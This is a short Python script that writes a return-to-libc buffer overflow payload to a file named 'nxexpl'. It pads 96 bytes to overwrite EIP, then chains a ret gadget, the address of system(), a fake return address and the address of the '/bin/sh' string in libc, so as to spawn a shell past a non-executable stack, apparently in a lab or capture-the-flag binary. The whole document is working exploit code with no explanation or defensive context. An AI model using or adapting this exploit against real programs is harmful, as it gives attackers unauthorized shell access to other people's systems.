#!/usr/bin/env python

buf = "A" * 96 # Initial EIP offset

buf += "\xf2\x82\x04\x08" # EIP gets the address of a ret in libc

buf += "\x20\x50\x08\x40" # system()  - non randomized address of the system()

buf += "DDDD" # any fake return address from the system()

buf += "\x0f\x96\x1a\x40" # "/bin/sh" from libc - an argument for the system()

with open('nxexpl', 'w') as f:
  f.write(buf)

